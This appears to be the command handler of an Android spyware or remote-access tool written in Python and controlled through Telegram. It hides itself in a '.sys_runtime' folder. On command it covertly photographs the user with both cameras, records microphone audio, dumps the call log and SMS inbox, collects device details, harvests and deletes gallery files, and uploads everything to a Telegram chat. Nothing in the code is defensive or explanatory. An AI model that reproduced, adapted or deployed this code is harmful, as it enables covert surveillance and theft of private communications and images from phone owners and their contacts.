# -*- coding: utf-8 -*-
import os,time,json,threading,logging,hashlib,secrets,gc
from datetime import datetime
P=os.path.join(os.getcwd(),".sys_runtime")
if not os.path.exists(P):os.makedirs(P)
logging.basicConfig(filename=os.path.join(P,"c.log"),level=logging.ERROR,filemode='w')
try:
 from jnius import autoclass
 JNI=True
except:
 JNI=False

class C:
 def __init__(self):
  self.t=os.path.join(P,"ctmp")
  if not os.path.exists(self.t):os.makedirs(self.t)
  self._cl()
  self.to=900
  self.lm=0
  self._up()
 def _cl(self):
  try:
   n=time.time()
   for f in os.listdir(self.t):
    p=os.path.join(self.t,f)
    if os.path.getmtime(p)<n-3600:os.remove(p)
  except:pass
 def _up(self):
  pe=os.path.join(P,"pending")
  if os.path.exists(pe):
   for f in os.listdir(pe):
    p=os.path.join(pe,f)
    try:os.remove(p)
    except:pass
 def _h(self,s):return hashlib.sha256(s.encode()).hexdigest()
 def _c(self,a,b):return secrets.compare_digest(a,b)
 def _sd(self,g=0.8):
  n=time.time()
  if n-self.lm<g:time.sleep(g-(n-self.lm))
  self.lm=time.time()
 def _sf(self,tg,cid,ct,fn):
  self._sd()
  p=os.path.join(self.t,fn)
  try:
   with open(p,'w',encoding='utf-8',errors='ignore') as f:f.write(ct)
   with open(p,'rb') as f:tg._ap("sendDocument",{"chat_id":cid,"caption":fn},{"document":f})
  except Exception as e:logging.error(str(e))
  finally:
   if os.path.exists(p):
    try:os.remove(p)
    except:pass
 def _bo(self,m):
  try:
   b,c=m._bat() if hasattr(m,'_bat') else (100,False)
   return b>=15 or c
  except:return True
 def _ra(self,d=10):
  if not JNI:return None
  mr=None
  try:
   MR=autoclass('android.media.MediaRecorder')
   o=os.path.join(self.t,f"a_{int(time.time())}.aac")
   mr=MR()
   mr.setAudioSource(MR.AudioSource.MIC)
   mr.setOutputFormat(MR.OutputFormat.MPEG_4)
   mr.setAudioEncoder(MR.AudioEncoder.AAC)
   mr.setAudioEncodingBitRate(64000)
   mr.setAudioSamplingRate(44100)
   mr.setOutputFile(o)
   mr.prepare();mr.start()
   time.sleep(d);mr.stop()
   return o
  except:return None
  finally:
   if mr:mr.release()
 def _gsi(self,m):
  if not JNI:return"?"
  try:
   B=autoclass('android.os.Build')
   S=autoclass('android.os.StatFs')
   E=autoclass('android.os.Environment')
   p=E.getDataDirectory().getPath()
   s=S(p)
   f=(s.getAvailableBlocksLong()*s.getBlockSizeLong())/(1024**3)
   ba,ch=m._bat() if hasattr(m,'_bat') else ("??",False)
   return f"📱 {B.MODEL}\n💾 {f:.1f}G\n🔋 {ba}%{'🔌' if ch else ''}"
  except:return"?"
 def _cll(self,l=100):
  if not JNI:return"?"
  try:
   r=autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
   U=autoclass('android.net.Uri')
   c=r.query(U.parse("content://call_log/calls"),None,None,None,"date DESC")
   if not c:return"?"
   ln=[]
   while c.moveToNext() and len(ln)<l:
    n=c.getString(c.getColumnIndex("name")) or "Unknown"
    nu=c.getString(c.getColumnIndex("number"))
    ln.append(f"👤 {n} ({nu})")
   c.close()
   return "\n".join(ln) if ln else "?"
  except:return"?"
 def _sl(self,l=100):
  if not JNI:return"?"
  try:
   r=autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
   U=autoclass('android.net.Uri')
   c=r.query(U.parse("content://sms/inbox"),None,None,None,"date DESC")
   if not c:return"?"
   ln=[]
   while c.moveToNext() and len(ln)<l:
    a=c.getString(c.getColumnIndex("address"))
    b=c.getString(c.getColumnIndex("body"))
    ln.append(f"📩 {a}\n💬 {b}\n---")
   c.close()
   return "\n".join(ln) if ln else"?"
  except:return"?"
 def ex(self,cmd,tg,m,cid,cbq=None):
  threading.Thread(target=self._r,args=(cmd,tg,m,cid,cbq),daemon=True).start()
 def _r(self,cmd,tg,m,cid,cbq):
  try:
   if cbq:tg._ap("answerCallbackQuery",{"callback_query_id":cbq,"text":"."})
   if not getattr(m,'auth_active',False):
    tg._ap("sendMessage",{"chat_id":cid,"text":"🔒 /login <pw>"})
    return
   if cmd.startswith("cam_"):
    did=cmd.split("_")[1]
    if not self._bo(m):tg._ap("sendMessage",{"chat_id":cid,"text":"🔋"});return
    if hasattr(m,'camera_analyzer'):
     p=m.camera_analyzer.capture(cam_id=0)
     if p and os.path.exists(p):
      with open(p,'rb') as f:tg._ap("sendPhoto",{"chat_id":cid,"caption":"📸"},{"photo":f})
      try:os.remove(p)
      except:pass
     else:tg._ap("sendMessage",{"chat_id":cid,"text":"❌"})
    else:tg._ap("sendMessage",{"chat_id":cid,"text":"❌"})
    gc.collect()
   elif cmd.startswith("camf_"):
    did=cmd.split("_")[1]
    if not self._bo(m):tg._ap("sendMessage",{"chat_id":cid,"text":"🔋"});return
    if hasattr(m,'camera_analyzer'):
     p=m.camera_analyzer.capture(cam_id=1)
     if p and os.path.exists(p):
      with open(p,'rb') as f:tg._ap("sendPhoto",{"chat_id":cid,"caption":"🤳"},{"photo":f})
      try:os.remove(p)
      except:pass
     else:tg._ap("sendMessage",{"chat_id":cid,"text":"❌"})
    else:tg._ap("sendMessage",{"chat_id":cid,"text":"❌"})
    gc.collect()
   elif cmd.startswith("mic_"):
    did=cmd.split("_")[1]
    tg._ap("sendMessage",{"chat_id":cid,"text":"🎤"})
    p=self._ra(10)
    if p:
     with open(p,'rb') as f:r=tg._ap("sendVoice",{"chat_id":cid},{"voice":f})
     if r and r.get('ok'):os.remove(p)
     else:
      pe=os.path.join(P,"pending")
      if not os.path.exists(pe):os.makedirs(pe)
      os.rename(p,os.path.join(pe,os.path.basename(p)))
    else:tg._ap("sendMessage",{"chat_id":cid,"text":"❌"})
    gc.collect()
   elif cmd.startswith("callog_"):
    did=cmd.split("_")[1]
    t=self._cll(100)
    self._sf(tg,cid,t,f"c_{did}.log")
   elif cmd.startswith("sms_"):
    did=cmd.split("_")[1]
    t=self._sl(100)
    self._sf(tg,cid,t,f"s_{did}.log")
   elif cmd.startswith("hrv_"):
    did=cmd.split("_")[1]
    if hasattr(m,'daily_zipper'):
     m.daily_zipper.run()
     tg._ap("sendMessage",{"chat_id":cid,"text":"📦"})
    else:tg._ap("sendMessage",{"chat_id":cid,"text":"❌"})
   elif cmd.startswith("media_"):
    did=cmd.split("_")[1]
    if hasattr(m,'gallery_browser'):
     kb=m.gallery_browser.get_grid_kb(cat="pending",page=0)
     r=tg._ap("sendMessage",{"chat_id":cid,"text":"🖼","reply_markup":json.dumps(kb)})
     if r and r.get('ok'):m.last_mid=r['result']['message_id']
   elif cmd.startswith("g_nav|"):
    parts=cmd.split("|")
    if len(parts)>=3:
     cat,pg=parts[1],int(parts[2])
     if hasattr(m,'gallery_browser'):
      nk=m.gallery_browser.get_grid_kb(cat=cat,page=pg)
      mid=getattr(m,'last_mid',None)
      if mid:tg._ap("editMessageReplyMarkup",{"chat_id":cid,"message_id":mid,"reply_markup":json.dumps(nk)})
   elif cmd.startswith("g_opt|"):
    parts=cmd.split("|")
    if len(parts)>=4:
     cat,pg,idx=parts[1],parts[2],parts[3]
     if hasattr(m,'gallery_browser'):m.gallery_browser.show_options(cid,cat,pg,idx)
   elif cmd.startswith("g_conf|"):
    parts=cmd.split("|")
    if len(parts)>=5:
     act,cat,pg,idx=parts[1],parts[2],parts[3],parts[4]
     ck=[[{"text":"🗑","callback_data":f"g_act|del|{cat}|{pg}|{idx}"},{"text":"🔙","callback_data":f"g_opt|{cat}|{pg}|{idx}"}]]
     tg._ap("sendMessage",{"chat_id":cid,"text":"⚠️","reply_markup":json.dumps({"inline_keyboard":ck})})
   elif cmd.startswith("g_act|"):
    parts=cmd.split("|")
    if len(parts)>=5:
     act,cat,pg,idx=parts[1],parts[2],parts[3],parts[4]
     if hasattr(m,'gallery_browser'):m.gallery_browser.execute_action(cid,act,cat,pg,idx)
  except Exception as e:
   logging.error(str(e))
   tg._ap("sendMessage",{"chat_id":cid,"text":"⚠️"})

_h=None
def ex(d,tg,m,cid,cbq=None):
 global _h
 if _h is None:_h=C()
 _h.ex(d,tg,m,cid,cbq)
